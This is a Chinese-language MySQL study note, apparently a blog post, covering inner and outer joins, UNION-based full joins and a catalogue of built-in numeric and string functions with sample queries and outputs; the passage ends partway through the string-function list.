<p>&#x5408;&#x5E76;&#x5177;&#x6709;&#x540C;&#x4E00;&#x5217;&#x7684;&#x4E24;&#x4E2A;&#x8868;&#x4EE5;&#x4E0A;&#x7684;&#x884C;&#xFF0C;&#x7ED3;&#x679C;&#x96C6;&#x4E0D;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x8868;&#x4E0E;&#x53E6;&#x4E00;&#x4E2A;&#x8868;&#x4E0D;&#x5339;&#x914D;&#x7684;&#x884C;&#xFF0C;&#x79F0;&#x4E3A;&#x5185;&#x8FDE;&#x63A5;&#x3002;&#x5408;&#x5E76;&#x5177;&#x6709;&#x540C;&#x4E00;&#x5217;&#x7684;&#x4E24;&#x4E2A;&#x8868;&#x4EE5;&#x4E0A;&#x7684;&#x884C;&#xFF0C;&#x7ED3;&#x679C;&#x96C6;&#x9664;&#x4E86;&#x5305;&#x542B;&#x4E00;&#x4E2A;&#x8868;&#x4E0E;&#x53E6;&#x4E00;&#x4E2A;&#x8868;&#x5339;&#x914D;&#x7684;&#x884C;&#x5916;&#xFF0C;&#x8FD8;&#x67E5;&#x8BE2;&#x5230;&#x5DE6;&#x6216;&#x53F3;&#x8868;&#x4E2D;&#x4E0D;&#x5339;&#x914D;&#x7684;&#x884C;&#xFF0C;&#x79F0;&#x4E3A;&#x5916;&#x8FDE;&#x63A5;&#x3002;</p>
<p>&#x5916;&#x8FDE;&#x63A5;&#x7684;&#x4E24;&#x4E2A;&#x8868;&#x5728;&#x8FDE;&#x63A5;&#x8FC7;&#x7A0B;&#x4E2D;&#x9664;&#x4E86;&#x8FD4;&#x56DE;&#x6EE1;&#x8DB3;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#x7684;&#x884C;&#x4EE5;&#x5916;&#x8FD8;&#x8FD4;&#x56DE;&#x5DE6;|&#x53F3;&#x8868;&#x4E2D;&#x4E0D;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;&#x884C;&#xFF0C;&#x8FD9;&#x79CD;&#x8FDE;&#x63A5;&#x4E5F;&#x79F0;&#x4E3A;&#x5DE6;|&#x53F3;&#x5916;&#x8FDE;&#x63A5;&#x3002;&#x6CA1;&#x6709;&#x5339;&#x914D;&#x7684;&#x884C;&#x65F6;&#xFF0C;&#x7ED3;&#x679C;&#x8868;&#x4E2D;&#x76F8;&#x5E94;&#x7684;&#x5217;&#x4E3A;&#x7A7A; NULL&#x3002;</p>
<p>&#x5982;&#x679C;&#x662F;&#x5DE6;&#x5916;&#x8FDE;&#x63A5;&#xFF0C;&#x5219;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#x4E2D;&#x5DE6;&#x8FB9;&#x7684;&#x8868;&#x4E5F;&#x79F0;&#x4E3A;<strong>&#x4E3B;&#x8868;</strong>&#xFF0C;&#x53F3;&#x8FB9;&#x7684;&#x8868;&#x79F0;&#x4E3A;<strong>&#x4ECE;&#x8868;</strong>&#x3002;&#x5982;&#x679C;&#x662F;&#x53F3;&#x5916;&#x8FDE;&#x63A5;&#xFF0C;&#x5219;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#x4E2D;&#x53F3;&#x8FB9;&#x7684;&#x8868;&#x4E5F;&#x79F0;&#x4E3A;<strong>&#x4E3B;&#x8868;</strong>&#xFF0C;&#x5DE6;&#x8FB9;&#x7684;&#x8868;&#x79F0;&#x4E3A;<strong>&#x4ECE;&#x8868;</strong>&#x3002;</p>
<p>MYSQL &#x4E0D;&#x652F;&#x6301; SQL92 &#x8BED;&#x6CD5;&#x4E2D;&#x7684;&#x5916;&#x8FDE;&#x63A5;&#x5199;&#x6CD5;&#xFF0C;&#x5373;&#x4F7F;&#x7528; + &#x7B26;&#x53F7;&#x3002;&#x5BF9;&#x4E8E; SQL99 &#x8BED;&#x6CD5; JOIN ON &#x5374;&#x53EF;&#x4EE5;&#x5F88;&#x597D;&#x652F;&#x6301;&#x3002;JOIN ON &#x8BED;&#x6CD5;&#x4E0D;&#x4EC5;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x591A;&#x8868;&#x67E5;&#x8BE2;&#xFF0C;&#x4E14;&#x80FD;&#x89E3;&#x51B3;&#x5916;&#x8FDE;&#x63A5;&#x95EE;&#x9898;&#x3002;JOIN &#x8FDE;&#x63A5;&#x5176;&#x4ED6;&#x8868;&#xFF0C;ON &#x540E;&#x63A5;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#x3002;</p>
<p>&#x6B64;&#x5916;&#xFF0C;&#x5168;&#x5916;&#x8FDE;&#x63A5;&#x7684; FULL OUTER JOIN &#x5199;&#x6CD5;&#x5BF9;&#x4E8E; MYSQL &#x540C;&#x6837;&#x4E0D;&#x652F;&#x6301;&#x3002;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x5229;&#x7528; UNION &#x5173;&#x952E;&#x5B57;&#x7ED9;&#x51FA;&#x591A;&#x6761; SELECT &#x8BED;&#x53E5;&#xFF0C;&#x5E76;&#x5C06;&#x7ED3;&#x679C;&#x7EC4;&#x6210;&#x5355;&#x4E2A;&#x7ED3;&#x679C;&#x96C6;&#x3002;&#x5408;&#x5E76;&#x65F6;&#xFF0C;&#x4E24;&#x4E2A;&#x8868;&#x5BF9;&#x5E94;&#x7684;&#x5217;&#x6570;&#x548C;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x76F8;&#x540C;&#x4E14;&#x5BF9;&#x5E94;&#x3002;&#x5404;&#x4E2A;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x4E4B;&#x95F4;&#x4F7F;&#x7528; UNION &#x6216; UNION ALL &#x5173;&#x952E;&#x5B57;&#x5206;&#x9694;&#x3002;&#x524D;&#x8005;&#x53D6;&#x5E76;&#x96C6;&#xFF0C;&#x540E;&#x8005;&#x4E0D;&#x53BB;&#x91CD;&#x3002;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;UNION ALL &#x6267;&#x884C;&#x8BED;&#x53E5;&#x65F6;&#x6240;&#x9700;&#x8D44;&#x6E90;&#x8F83; UNION &#x66F4;&#x5C11;&#x3002;&#x82E5;&#x660E;&#x786E;&#x77E5;&#x9053;&#x5408;&#x5E76;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#x91CD;&#x590D;&#x6216;&#x8005;&#x4E0D;&#x9700;&#x8981;&#x53BB;&#x9664;&#x91CD;&#x590D;&#x6570;&#x636E;&#xFF0C;&#x5219;&#x5C3D;&#x91CF;&#x4F7F;&#x7528; UNION ALL &#x63D0;&#x9AD8;&#x67E5;&#x8BE2;&#x7684;&#x6548;&#x7387;&#x3002;</p>
<pre><code class="language-javascript">SELECT column,... FROM table1 UNION [ALL] SELECT column,... FROM table2;
</code></pre>
<pre><code class="language-javascript"># &#x67E5;&#x8BE2;&#x6240;&#x6709;&#x5458;&#x5DE5;&#x7684;last_name&amp;department_name =&gt; &#x4E24;&#x5F20;&#x8868;&#x5404;&#x81EA;&#x6709;&#x5458;&#x5DE5;&#x540D;&#x5355; =&gt; &#x6B63;&#x89E3;&#x5DE6;&#x5916;&#x8FDE;&#x63A5;
SELECT employee_id,department_name FROM employees e JOIN departments d ON e.department_id = d.department_id;
# &#x4E0D;&#x5199; INNER &#x9ED8;&#x8BA4;&#x5185;&#x8FDE;&#x63A5;
SELECT employee_id,department_name FROM employees e INNER JOIN departments d ON e.department_id = d.department_id;
# &#x5DE6;&#x5916;&#x8FDE;&#x63A5;
SELECT employee_id,department_name FROM employees e LEFT OUTER JOIN departments d ON e.department_id = d.department_id;
# &#x5DE6;&#x5916;&#x8FDE;&#x63A5;&#x7B80;&#x5199;
SELECT employee_id,department_name FROM employees e LEFT JOIN departments d ON e.department_id = d.department_id;
# &#x6EE1;&#x5916;&#x8FDE;&#x63A5;|&#x5168;&#x5916;&#x8FDE;&#x63A5;
SELECT employee_id,department_name FROM employees e FULL OUTER JOIN departments d ON e.department_id = d.department_id;
</code></pre>
<pre><code class="language-javascript"># ORACLE
SELECT employee_id,department_name FROM employees e,departments d WHERE e.department_id(+) = d.department_id;
SELECT last_name,department_name FROM employees e FULL JOIN departments d ON e.department_id = d.department_id;
</code></pre>
<p><img src="yourdomain.com/content/images/2022/04/SQLJOIN.jpeg" alt="MySQL &#x7B14;&#x8BB0;" loading="lazy"></p>
<pre><code class="language-javascript"># &#x53F3;&#x4E0A;&#x56FE; =&gt; &#x53F3;&#x5916;&#x8FDE;&#x63A5;
SELECT employee_id,department_name FROM employees e RIGHT JOIN departments d ON e.department_id = d.department_id;
# &#x5DE6;&#x4E2D;&#x56FE;
SELECT employee_id,department_name FROM employees e LEFT JOIN departments d ON e.department_id = d.department_id WHERE d.department_id IS NULL;
# &#x53F3;&#x4E2D;&#x56FE;
SELECT employee_id,department_name FROM employees e RIGHT JOIN departments d ON e.department_id = d.department_id WHERE e.department_id IS NULL;
# &#x5DE6;&#x4E0B;&#x56FE; =&gt; &#x6EE1;&#x5916;&#x8FDE;&#x63A5; =&gt; &#x5DE6;&#x4E0A;&#x56FE; UNION ALL &#x53F3;&#x4E2D;&#x56FE;
SELECT employee_id,department_name FROM employees e LEFT OUTER JOIN departments d ON e.department_id = d.department_id UNION ALL SELECT employee_id,department_name FROM employees e RIGHT JOIN departments d ON e.department_id = d.department_id WHERE e.department_id IS NULL;
# &#x53F3;&#x4E0B;&#x56FE; =&gt; &#x5DE6;&#x4E2D;&#x56FE; UNION ALL &#x53F3;&#x4E2D;&#x56FE;
SELECT employee_id,department_name FROM employees e LEFT JOIN departments d ON e.department_id = d.department_id WHERE d.department_id IS NULL UNION ALL SELECT employee_id,department_name FROM employees e RIGHT JOIN departments d ON e.department_id = d.department_id WHERE e.department_id IS NULL; 
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0">&#x5185;&#x7F6E;&#x51FD;&#x6570;</h2>
<p>&#x4F7F;&#x7528; SQL &#x8BED;&#x8A00;&#x65F6;&#xFF0C;&#x5E76;&#x975E;&#x76F4;&#x63A5;&#x4E0E;&#x8FD9;&#x95E8;&#x8BED;&#x8A00;&#x6253;&#x4EA4;&#x9053;&#xFF0C;&#x800C;&#x662F;&#x901A;&#x8FC7;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x8F6F;&#x4EF6;&#x64CD;&#x4F5C;&#x3002;DBMS &#x95F4;&#x7684;&#x5DEE;&#x5F02;&#x6027;&#x5F88;&#x5927;&#xFF0C;&#x8FDC;&#x5927;&#x4E8E;&#x540C;&#x8BED;&#x8A00;&#x4E0D;&#x540C;&#x7248;&#x672C;&#x4E4B;&#x95F4;&#x7684;&#x5DEE;&#x5F02;&#x3002;&#x5B9E;&#x9645;&#x4E0A;&#x53EA;&#x6709;&#x5F88;&#x5C11;&#x7684;&#x51FD;&#x6570;&#x662F;&#x88AB; DBMS &#x540C;&#x65F6;&#x652F;&#x6301;&#x7684;&#x3002;&#x4EE5;&#x62FC;&#x63A5;&#x7B26;&#x6765;&#x8BF4;&#xFF0C;&#x5927;&#x591A;&#x6570; DBMS &#x4F7F;&#x7528; || &#x6216;&#x8005; +&#xFF0C;&#x800C;&#x5728; MySQL &#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&#x51FD;&#x6570;&#x4E3A; <code>concat()</code>&#x3002;&#x5728;&#x4F7F;&#x7528;&#x65F6;&#x5019;&#x9700;&#x8981;&#x7279;&#x522B;&#x6CE8;&#x610F; SQL &#x51FD;&#x6570;&#x7684;&#x4EE3;&#x7801;&#x53EF;&#x79FB;&#x690D;&#x6027;&#x662F;&#x5F88;&#x5DEE;&#x7684;&#x3002;</p>
<p><img src="yourdomain.com/content/images/2022/04/mysql----.png" alt="MySQL &#x7B14;&#x8BB0;" loading="lazy"></p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0">&#x5355;&#x884C;&#x51FD;&#x6570;</h2>
<p>&#x5355;&#x884C;&#x51FD;&#x6570;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#xFF0C;&#x63A5;&#x53D7;&#x53C2;&#x6570;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7ED3;&#x679C;&#xFF0C;&#x4E14;&#x53EA;&#x5BF9;&#x4E00;&#x884C;&#x8FDB;&#x884C;&#x53D8;&#x6362;&#xFF0C;&#x6BCF;&#x884C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7ED3;&#x679C;&#x3002;&#x53EF;&#x4EE5;&#x5D4C;&#x5957;&#xFF0C;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x5217;&#x6216;&#x4E00;&#x4E2A;&#x503C;&#x3002;</p>
<h3 id="%E6%95%B0%E5%80%BC%E5%87%BD%E6%95%B0">&#x6570;&#x503C;&#x51FD;&#x6570;</h3>
<ul>
<li>&#x57FA;&#x672C;&#x51FD;&#x6570;</li>
</ul>
<pre><code class="language-javascript">/*
ABS(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x7EDD;&#x5BF9;&#x503C;
SIGN(X) =&gt; &#x8FD4;&#x56DE;X&#x7684;&#x7B26;&#x53F7;;&#x6B63;&#x6570;&#x8FD4;&#x56DE;1,&#x8D1F;&#x6570;&#x8FD4;&#x56DE;-1,0&#x8FD4;&#x56DE;0.
PI() =&gt; &#x8FD4;&#x56DE;&#x5706;&#x5468;&#x7387;&#x7684;&#x503C;
CEIL(x)&#xFF0C;CEILING(x) =&gt; &#x8FD4;&#x56DE;&#x5927;&#x4E8E;&#x6216;&#x7B49;&#x4E8E;&#x67D0;&#x4E2A;&#x503C;&#x7684;&#x6700;&#x5C0F;&#x6574;&#x6570;
FLOOR(x) =&gt; &#x8FD4;&#x56DE;&#x5C0F;&#x4E8E;&#x6216;&#x7B49;&#x4E8E;&#x67D0;&#x4E2A;&#x503C;&#x7684;&#x6700;&#x5927;&#x6574;&#x6570;
LEAST(e1,e2,e3&#x2026;) =&gt; &#x8FD4;&#x56DE;&#x5217;&#x8868;&#x4E2D;&#x7684;&#x6700;&#x5C0F;&#x503C;
GREATEST(e1,e2,e3&#x2026;)	=&gt; &#x8FD4;&#x56DE;&#x5217;&#x8868;&#x4E2D;&#x7684;&#x6700;&#x5927;&#x503C;
MOD(x,y) =&gt; &#x8FD4;&#x56DE;X&#x9664;&#x4EE5;Y&#x540E;&#x7684;&#x4F59;&#x6570;
RAND() =&gt; &#x8FD4;&#x56DE;0~1&#x7684;&#x968F;&#x673A;&#x503C;
RAND(x)	=&gt; &#x8FD4;&#x56DE;0~1&#x7684;&#x968F;&#x673A;&#x503C;,&#x5176;&#x4E2D;x&#x7684;&#x503C;&#x7528;&#x4F5C;&#x79CD;&#x5B50;&#x503C;,&#x76F8;&#x540C;&#x7684;X&#x503C;&#x4F1A;&#x4EA7;&#x751F;&#x76F8;&#x540C;&#x7684;&#x968F;&#x673A;&#x6570;
ROUND(x) =&gt; &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5BF9;x&#x7684;&#x503C;&#x8FDB;&#x884C;&#x56DB;&#x820D;&#x4E94;&#x5165;&#x540E;&#x6700;&#x63A5;&#x8FD1;&#x4E8E;X&#x7684;&#x6574;&#x6570;
ROUND(x,y) =&gt; &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5BF9;x&#x7684;&#x503C;&#x8FDB;&#x884C;&#x56DB;&#x820D;&#x4E94;&#x5165;&#x540E;&#x6700;&#x63A5;&#x8FD1;X&#x7684;&#x503C;,&#x5E76;&#x4FDD;&#x7559;&#x5230;&#x5C0F;&#x6570;&#x70B9;&#x540E;&#x9762;Y&#x4F4D;
TRUNCATE(x,y) =&gt; &#x8FD4;&#x56DE;&#x6570;&#x5B57;x&#x622A;&#x65AD;&#x4E3A;y&#x4F4D;&#x5C0F;&#x6570;&#x7684;&#x7ED3;&#x679C;
SQRT(x)	=&gt; &#x8FD4;&#x56DE;x&#x7684;&#x5E73;&#x65B9;&#x6839;.&#x5F53;X&#x7684;&#x503C;&#x4E3A;&#x8D1F;&#x6570;&#x65F6;&#x8FD4;&#x56DE;NULL
*/
SELECT ABS(-123),ABS(32),SIGN(-23),SIGN(43),PI(),CEIL(32.32),CEILING(-43.23),FLOOR(32.32),FLOOR(-43.23),MOD(12,5) FROM DUAL;
+-----------+---------+-----------+----------+----------+-------------+-----------------+--------------+---------------+-----------+
| ABS(-123) | ABS(32) | SIGN(-23) | SIGN(43) | PI()     | CEIL(32.32) | CEILING(-43.23) | FLOOR(32.32) | FLOOR(-43.23) | MOD(12,5) |
+-----------+---------+-----------+----------+----------+-------------+-----------------+--------------+---------------+-----------+
|       123 |      32 |        -1 |        1 | 3.141593 |          33 |             -43 |           32 |           -44 |         2 |
+-----------+---------+-----------+----------+----------+-------------+-----------------+--------------+---------------+-----------+
SELECT RAND(),RAND(),RAND(10),RAND(10),RAND(-1),RAND(-1) FROM DUAL;
+--------------------+---------------------+--------------------+--------------------+--------------------+--------------------+
| RAND()             | RAND()              | RAND(10)           | RAND(10)           | RAND(-1)           | RAND(-1)           |
+--------------------+---------------------+--------------------+--------------------+--------------------+--------------------+
| 0.8067864736605309 | 0.26417954663203985 | 0.6570515219653505 | 0.6570515219653505 | 0.9050373219931845 | 0.9050373219931845 |
+--------------------+---------------------+--------------------+--------------------+--------------------+--------------------+
SELECT ROUND(12.34),ROUND(12.344,2),ROUND(12.345,-1),TRUNCATE(12.34,1),TRUNCATE(12.345,2),TRUNCATE(12.34,-1) FROM DUAL;
+--------------+-----------------+------------------+-------------------+--------------------+--------------------+
| ROUND(12.34) | ROUND(12.344,2) | ROUND(12.345,-1) | TRUNCATE(12.34,1) | TRUNCATE(12.345,2) | TRUNCATE(12.34,-1) |
+--------------+-----------------+------------------+-------------------+--------------------+--------------------+
|           12 |           12.34 |               10 |              12.3 |              12.34 |                 10 |
+--------------+-----------------+------------------+-------------------+--------------------+--------------------+
</code></pre>
<ul>
<li>&#x89D2;&#x5EA6;&#x4E0E;&#x5F27;&#x5EA6;</li>
</ul>
<pre><code class="language-javascript">/*
RADIANS(x) =&gt; &#x5C06;&#x89D2;&#x5EA6;&#x8F6C;&#x5316;&#x4E3A;&#x5F27;&#x5EA6;,&#x53C2;&#x6570;x&#x4E3A;&#x89D2;&#x5EA6;&#x503C;
DEGREES(x) =&gt; &#x5C06;&#x5F27;&#x5EA6;&#x8F6C;&#x5316;&#x4E3A;&#x89D2;&#x5EA6;,&#x53C2;&#x6570;x&#x4E3A;&#x5F27;&#x5EA6;&#x503C;
*/
SELECT RADIANS(30),RADIANS(60),RADIANS(90),DEGREES(2*PI()),DEGREES(RADIANS(90)) FROM DUAL;
+--------------------+--------------------+--------------------+-----------------+----------------------+
| RADIANS(30)        | RADIANS(60)        | RADIANS(90)        | DEGREES(2*PI()) | DEGREES(RADIANS(90)) |
+--------------------+--------------------+--------------------+-----------------+----------------------+
| 0.5235987755982988 | 1.0471975511965976 | 1.5707963267948966 |             360 |                   90 |
+--------------------+--------------------+--------------------+-----------------+----------------------+
</code></pre>
<ul>
<li>&#x4E09;&#x89D2;&#x51FD;&#x6570;</li>
</ul>
<pre><code class="language-javascript">/*
SIN(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x6B63;&#x5F26;&#x503C;,&#x5176;&#x4E2D;&#x53C2;&#x6570;x&#x4E3A;&#x5F27;&#x5EA6;&#x503C;
ASIN(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x53CD;&#x6B63;&#x5F26;&#x503C;,&#x5373;&#x83B7;&#x53D6;&#x6B63;&#x5F26;&#x4E3A;x&#x7684;&#x503C;.&#x5982;&#x679C;x&#x7684;&#x503C;&#x4E0D;&#x5728;-1&#x5230;1&#x4E4B;&#x95F4;&#x5219;&#x8FD4;&#x56DE;NULL
COS(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x4F59;&#x5F26;&#x503C;,&#x5176;&#x4E2D;&#x53C2;&#x6570;x&#x4E3A;&#x5F27;&#x5EA6;&#x503C;
ACOS(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x53CD;&#x4F59;&#x5F26;&#x503C;,&#x5373;&#x83B7;&#x53D6;&#x4F59;&#x5F26;&#x4E3A;x&#x7684;&#x503C;.&#x5982;&#x679C;x&#x7684;&#x503C;&#x4E0D;&#x5728;-1&#x5230;1&#x4E4B;&#x95F4;,&#x5219;&#x8FD4;&#x56DE;NULL
TAN(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x6B63;&#x5207;&#x503C;,&#x5176;&#x4E2D;&#x53C2;&#x6570;x&#x4E3A;&#x5F27;&#x5EA6;&#x503C;
ATAN(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x53CD;&#x6B63;&#x5207;&#x503C;,&#x5373;&#x8FD4;&#x56DE;&#x6B63;&#x5207;&#x503C;&#x4E3A;x&#x7684;&#x503C;
ATAN2(m,n) =&gt; &#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x53CD;&#x6B63;&#x5207;&#x503C;
COT(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x4F59;&#x5207;&#x503C;,&#x5176;&#x4E2D;X&#x4E3A;&#x5F27;&#x5EA6;&#x503C;
*/
SELECT SIN(RADIANS(30)),DEGREES(ASIN(1)),TAN(RADIANS(45)),DEGREES(ATAN(1)),DEGREES(ATAN2(1,1)) FROM DUAL;
+---------------------+------------------+--------------------+------------------+---------------------+
| SIN(RADIANS(30))    | DEGREES(ASIN(1)) | TAN(RADIANS(45))   | DEGREES(ATAN(1)) | DEGREES(ATAN2(1,1)) |
+---------------------+------------------+--------------------+------------------+---------------------+
| 0.49999999999999994 |               90 | 0.9999999999999999 |               45 |                  45 |
+---------------------+------------------+--------------------+------------------+---------------------+
</code></pre>
<ul>
<li>&#x6307;&#x6570;&#x4E0E;&#x5BF9;&#x6570;</li>
</ul>
<pre><code class="language-javascript">/*
POW(x,y) POWER(X,Y) =&gt; &#x8FD4;&#x56DE;x&#x7684;y&#x6B21;&#x65B9;
EXP(X) =&gt; &#x8FD4;&#x56DE;e&#x7684;X&#x6B21;&#x65B9;&#xFF0C;&#x5176;&#x4E2D;e&#x662F;&#x4E00;&#x4E2A;&#x5E38;&#x6570;&#xFF0C;2.718281828459045
LN(X) LOG(X) =&gt; &#x8FD4;&#x56DE;&#x4EE5;e&#x4E3A;&#x5E95;&#x7684;X&#x7684;&#x5BF9;&#x6570;&#xFF0C;&#x5F53;X &lt;= 0 &#x65F6;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x7ED3;&#x679C;&#x4E3A;NULL
LOG10(X) =&gt; &#x8FD4;&#x56DE;&#x4EE5;10&#x4E3A;&#x5E95;&#x7684;X&#x7684;&#x5BF9;&#x6570;&#xFF0C;&#x5F53;X &lt;= 0 &#x65F6;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x7ED3;&#x679C;&#x4E3A;NULL
LOG2(X) =&gt; &#x8FD4;&#x56DE;&#x4EE5;2&#x4E3A;&#x5E95;&#x7684;X&#x7684;&#x5BF9;&#x6570;&#xFF0C;&#x5F53;X &lt;= 0 &#x65F6;&#xFF0C;&#x8FD4;&#x56DE;NULL
*/
SELECT POW(2,5),POWER(2,4),EXP(2),LN(EXP(2)),LOG10(10),LOG2(4) FROM DUAL;
+----------+------------+------------------+------------+-----------+---------+
| POW(2,5) | POWER(2,4) | EXP(2)           | LN(EXP(2)) | LOG10(10) | LOG2(4) |
+----------+------------+------------------+------------+-----------+---------+
|       32 |         16 | 7.38905609893065 |          2 |         1 |       2 |
+----------+------------+------------------+------------+-----------+---------+
</code></pre>
<ul>
<li>&#x8FDB;&#x5236;&#x8F6C;&#x6362;</li>
</ul>
<pre><code class="language-javascript">/*
BIN(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7F16;&#x7801;
HEX(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7F16;&#x7801;
OCT(x) =&gt; &#x8FD4;&#x56DE;x&#x7684;&#x516B;&#x8FDB;&#x5236;&#x7F16;&#x7801;
CONV(x,f1,f2) =&gt; &#x8FD4;&#x56DE;f1&#x8FDB;&#x5236;&#x6570;&#x53D8;&#x6210;f2&#x8FDB;&#x5236;&#x6570;
*/
+---------+---------+---------+--------------+
| BIN(10) | HEX(10) | OCT(10) | CONV(10,2,8) |
+---------+---------+---------+--------------+
| 1010    | A       | 12      | 2            |
+---------+---------+---------+--------------+
</code></pre>
<h3 id="%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0">&#x5B57;&#x7B26;&#x4E32;&#x51FD;&#x6570;</h3>
<pre><code class="language-javascript">/*
MySQL &#x4E2D;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x4F4D;&#x7F6E;&#x662F;&#x4ECE;1&#x5F00;&#x59CB;&#x7684;!
ASCII(S) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;S&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x7684;ASCII&#x7801;&#x503C;
CHAR_LENGTH(s) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;s&#x7684;&#x5B57;&#x7B26;&#x6570;,&#x4F5C;&#x7528;&#x4E0E;CHARACTER_LENGTH(s)&#x76F8;&#x540C;
LENGTH(s) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;s&#x548C;&#x5B57;&#x7B26;&#x96C6;&#x6709;&#x5173;&#x7684;&#x5B57;&#x8282;&#x6570;
CONCAT(s1,s2,......,sn) =&gt; &#x8FDE;&#x63A5;s1,s2,&#x2026;,sn&#x4E3A;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;
CONCAT_WS(x, s1,s2,......,sn) =&gt; &#x540C;CONCAT(s1,s2,&#x2026;)&#x51FD;&#x6570;,&#x4F46;&#x662F;&#x6BCF;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x4E4B;&#x95F4;&#x8981;&#x52A0;&#x4E0A;x
INSERT(str, idx, len, replacestr) =&gt; &#x5C06;&#x5B57;&#x7B26;&#x4E32;str&#x4ECE;&#x7B2C;idx&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;,len&#x4E2A;&#x5B57;&#x7B26;&#x957F;&#x7684;&#x5B50;&#x4E32;&#x66FF;&#x6362;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;replacestr
REPLACE(str, a, b) =&gt; &#x7528;&#x5B57;&#x7B26;&#x4E32;b&#x66FF;&#x6362;&#x5B57;&#x7B26;&#x4E32;str&#x4E2D;&#x6240;&#x6709;&#x51FA;&#x73B0;&#x7684;&#x5B57;&#x7B26;&#x4E32;a
UPPER(s) &#x6216; UCASE(s) =&gt; &#x5C06;&#x5B57;&#x7B26;&#x4E32;s&#x7684;&#x6240;&#x6709;&#x5B57;&#x6BCD;&#x8F6C;&#x6210;&#x5927;&#x5199;&#x5B57;&#x6BCD;
LOWER(s) &#x6216;LCASE(s) =&gt; &#x5C06;&#x5B57;&#x7B26;&#x4E32;s&#x7684;&#x6240;&#x6709;&#x5B57;&#x6BCD;&#x8F6C;&#x6210;&#x5C0F;&#x5199;&#x5B57;&#x6BCD;
LEFT(str,n) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;str&#x6700;&#x5DE6;&#x8FB9;&#x7684;n&#x4E2A;&#x5B57;&#x7B26;
RIGHT(str,n) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;str&#x6700;&#x53F3;&#x8FB9;&#x7684;n&#x4E2A;&#x5B57;&#x7B26;
LPAD(str, len, pad) =&gt; &#x7528;&#x5B57;&#x7B26;&#x4E32;pad&#x5BF9;str&#x6700;&#x5DE6;&#x8FB9;&#x8FDB;&#x884C;&#x586B;&#x5145;,&#x76F4;&#x5230;str&#x7684;&#x957F;&#x5EA6;&#x4E3A;len&#x4E2A;&#x5B57;&#x7B26;
RPAD(str ,len, pad) =&gt; &#x7528;&#x5B57;&#x7B26;&#x4E32;pad&#x5BF9;str&#x6700;&#x53F3;&#x8FB9;&#x8FDB;&#x884C;&#x586B;&#x5145;,&#x76F4;&#x5230;str&#x7684;&#x957F;&#x5EA6;&#x4E3A;len&#x4E2A;&#x5B57;&#x7B26;
LTRIM(s) =&gt; &#x53BB;&#x6389;&#x5B57;&#x7B26;&#x4E32;s&#x5DE6;&#x4FA7;&#x7684;&#x7A7A;&#x683C;
RTRIM(s) =&gt; &#x53BB;&#x6389;&#x5B57;&#x7B26;&#x4E32;s&#x53F3;&#x4FA7;&#x7684;&#x7A7A;&#x683C;
TRIM(s) =&gt; &#x53BB;&#x6389;&#x5B57;&#x7B26;&#x4E32;s&#x5F00;&#x59CB;&#x4E0E;&#x7ED3;&#x5C3E;&#x7684;&#x7A7A;&#x683C;
TRIM(s1 FROM s) =&gt; &#x53BB;&#x6389;&#x5B57;&#x7B26;&#x4E32;s&#x5F00;&#x59CB;&#x4E0E;&#x7ED3;&#x5C3E;&#x7684;s1
TRIM(LEADING s1 FROM s) =&gt; &#x53BB;&#x6389;&#x5B57;&#x7B26;&#x4E32;s&#x5F00;&#x59CB;&#x5904;&#x7684;s1
